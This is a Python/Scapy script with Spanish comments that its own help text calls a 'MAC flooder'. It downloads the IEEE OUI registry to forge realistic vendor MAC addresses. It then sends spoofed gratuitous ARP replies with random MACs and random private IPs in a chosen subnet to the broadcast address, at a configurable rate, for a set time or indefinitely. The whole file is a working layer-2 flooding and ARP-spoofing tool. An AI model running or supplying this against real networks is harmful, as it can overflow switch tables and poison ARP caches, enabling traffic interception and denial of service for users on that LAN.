from scapy.all import ARP, Ether, sendp, RandMAC, Padding, conf
import argparse
import re
import random
import time
import urllib.request
import csv

DEST_MAC = "FF:FF:FF:FF:FF:FF"

def obtener_todos_los_ouis_ieee():
    # URL oficial del registro OUI de la IEEE en formato CSV
    url = "http://standards-oui.ieee.org/oui/oui.csv"
    lista_vendors = []
    
    print("Descargando la base de datos oficial de la IEEE (esto puede tomar unos segundos)...")
    
    try:
        # Descargar el archivo
        respuesta = urllib.request.urlopen(url)
        # Leer las líneas y decodificarlas
        lineas = [l.decode('utf-8') for l in respuesta.readlines()]
        
        # Leer como CSV
        lector_csv = csv.reader(lineas)
        next(lector_csv) # Saltar la primera fila (los encabezados)
        
        for fila in lector_csv:
            if len(fila) >= 2:
                # El OUI/Assignment suele estar en la segunda columna (índice 1)
                oui_crudo = fila[1].lower() 
                
                # Asegurarse de que tiene 6 caracteres (ej. "00000c")
                if len(oui_crudo) == 6:
                    # Formatearlo a "00:00:0c"
                    oui_formateado = f"{oui_crudo[0:2]}:{oui_crudo[2:4]}:{oui_crudo[4:6]}"
                    lista_vendors.append(oui_formateado)
                    
        return lista_vendors
        
    except Exception as e:
        print(f"Error al descargar o procesar la lista: {e}")
        return []

        
def validate_ipv4(ip):  # -1 si es invalido
    # solo una barra
    if ip.count("/") != 1:
        return -1
    # tiene que tener si o si 3 puntos
    if ip.count(".") != 3:
        return -1
    # no puede haber letras
    if re.search("[a-zA-Z]", ip):
        return -1

    mascara_idx = ip.index("/")  # busco donde comienza la barra
    try:
        mascara = int(ip[mascara_idx + 1 :])  # solo el numero de la mascara
    except ValueError:
        return -1
    
    ipv4 = ip[:mascara_idx]  # solo la parte de la ip

    # OPTIMIZACIÓN: Separamos los octetos directamente usando split
    try:
        octetos = [int(x) for x in ipv4.split(".")]
    except ValueError:
        # Por si hay puntos consecutivos o formatos extraños como '10..0.1'
        return -1

    # Validamos que los 4 octetos estén en el rango correcto (0-255)
    for octeto in octetos:
        if octeto < 0 or octeto > 255:
            return -1

    # la mascara no puede ser menor q 0 ni mayor qq 32
    if mascara > 32 or mascara < 0:  
        return -1

    match octetos[0]:
        case 10:
            if mascara < 8:  # CORRECCIÓN: La red de clase A privada (10.0.0.0) empieza en /8
                return -1
        case 172:
            if octetos[1] < 16 or octetos[1] > 31:  # segundo octeto entre 16-31
                return -1
            if mascara < 12:  # la mascara no puede ser menor a 12
                return -1
        case 192:
            if octetos[1] != 168:  # el 2do octeto debe ser 168
                return -1
            if mascara < 16:  # la mascara no puede ser menor a 16
                return -1
        case _:  # cualquier otro caso es invalido porque no es privada
            return -1
# --- AQUÍ COMIENZA LA OPERACIÓN AND ---
    
    # 1. Convertimos los 4 octetos en un solo número entero de 32 bits
    ip_int = (octetos[0] << 24) | (octetos[1] << 16) | (octetos[2] << 8) | octetos[3]
    
    # 2. Generamos la máscara en formato de 32 bits
    # Ejemplo para /24: Desplaza 32 unos hacia la izquierda (32-24=8 veces)
    mascara_int = (0xFFFFFFFF << (32 - mascara)) & 0xFFFFFFFF
    
    # 3. HACEMOS LA OPERACIÓN AND BIT A BIT
    ip_base_int = ip_int & mascara_int
    
    # 4. Volvemos a separar el número de 32 bits en 4 octetos
    oct1 = (ip_base_int >> 24) & 255
    oct2 = (ip_base_int >> 16) & 255
    oct3 = (ip_base_int >> 8) & 255
    oct4 = ip_base_int & 255
    
    ip_base_str = f"{oct1}.{oct2}.{oct3}.{oct4}"

    # Retorna la IP base calculada y la máscara
    return mascara, ip_base_str

def validat_args():
    p = argparse.ArgumentParser(description="MAC flooder")
    p.add_argument("red", help="red/máscara, ej 10.10.10.0/24")   # posicional, obligatorio
    p.add_argument("-i", "--iface", required=True)
    p.add_argument("-r", "--rate", type=float, default=1000, help="paquetes por segundo")
    p.add_argument("-d", "--duracion", type=float, default=0, help="segundos; 0 = infinito")
    args = p.parse_args()
    return args


def generar_ip_aleatoria_manual(ip_base_str, mascara):
    # 1. Convertimos la IP base (ej. "192.168.1.0") a un entero de 32 bits
    octetos = [int(x) for x in ip_base_str.split(".")]
    ip_base_int = (octetos[0] << 24) | (octetos[1] << 16) | (octetos[2] << 8) | octetos[3]
    
    # 2. Calculamos cuántos bits están destinados a los hosts
    bits_host = 32 - mascara
    
    # 3. Calculamos la cantidad total de direcciones posibles para esa porción de host
    # El operador ** es potencia. Por ejemplo, 2 ** 8 = 256
    total_ips = 2 ** bits_host
    
    # Si la máscara es 32 (1 sola IP) o 31 (enlaces punto a punto), no hay hosts válidos aleatorios
    if bits_host <= 1:
        return ip_base_str
        
    # 4. Elegimos un número de host al azar. 
    # Empezamos en 1 (para evitar el 0, que es la red) 
    # Terminamos en total_ips - 2 (para evitar el broadcast, que son todos puros 1)
    host_aleatorio = random.randint(1, total_ips - 2)
    
    # 5. Insertamos el host aleatorio en la IP base.
    # Como sabemos que en la ip_base_int la parte de host son todos ceros,
    # hacer un OR (|) bit a bit simplemente "pega" nuestro host_aleatorio al final.
    ip_final_int = ip_base_int | host_aleatorio
    
    # 6. Volvemos a desarmar el número de 32 bits en 4 octetos para tener formato texto
    oct1 = (ip_final_int >> 24) & 255
    oct2 = (ip_final_int >> 16) & 255
    oct3 = (ip_final_int >> 8) & 255
    oct4 = ip_final_int & 255
    
    return f"{oct1}.{oct2}.{oct3}.{oct4}"
    

def create_packet(ipv4, mascara, lista_vendors):
    randVendor = random.choice(lista_vendors)

    randMAC = randVendor + ":" + ":".join(RandMAC().split(":")[3:])

    randIP = generar_ip_aleatoria_manual(ipv4, mascara)

    relleno = b"\x00" * 18
        
    packet = (
        Ether(src=randMAC, dst=DEST_MAC)
        / ARP(
            op=2,
            psrc=randIP,
            pdst=randIP,
            hwdst=DEST_MAC,
            hwsrc=randMAC
        )
        / Padding(load=relleno)
    )
    return packet

def get_timer(args):
    return 1 / args.rate


def start():
    args = validat_args()
    resultado = validate_ipv4(args.red)

    if resultado == -1:
        print("Error: la red o máscara ingresada no es válida.")
        return

    mascara, ipv4 = resultado
    lista_vendors = obtener_todos_los_ouis_ieee()
    if not lista_vendors:
        print("no se consiguio los vendors de ieee, uso pre-cargados")
        lista_vendors = [
            # Cisco Systems
            "00:00:0c", "00:40:96", "00:14:69",
            # Apple
            "00:1f:5b", "00:1e:52", "00:23:df",
            # Intel Corporate
            "00:1b:21", "00:1c:c0", "00:21:5c",
            # Samsung Electronics
            "00:15:b9", "00:1e:b2", "00:21:19",
            # Microsoft Corporation
            "00:15:5d", "00:1d:d8", "00:22:48",
            # Hewlett Packard (HP)
            "00:0f:20", "00:11:0a", "00:14:38",
            # Huawei Technologies
            "00:1e:10", "00:25:9e", "00:46:4b",
            # Sony Corporation
            "00:01:4a", "00:13:a9", "00:19:c5",
            # Dell
            "00:14:22", "00:1e:4f", "00:21:70",
            # VMware (Máquinas virtuales)
            "00:50:56", "00:0c:29", "00:1c:14"
        ]

    if args.duracion != 0:
        fin = time.time() + args.duracion
    cont = 0
    timer = get_timer(args)

    s = conf.L2socket(iface=args.iface)   # abrís el socket UNA vez
    try:
        while True:
            if args.duracion != 0 and time.time() >= fin:
                break
            packet = create_packet(ipv4, mascara, lista_vendors)
            s.send(packet)                # mandás por el socket ya abierto
            cont += 1
            time.sleep(timer)
    except KeyboardInterrupt:
        pass
    finally:
        s.close()                         # lo cerrás sí o sí, pase lo que pase

    print(f"Total de MACs enviadas: {cont}")
if __name__ == "__main__":
    start()
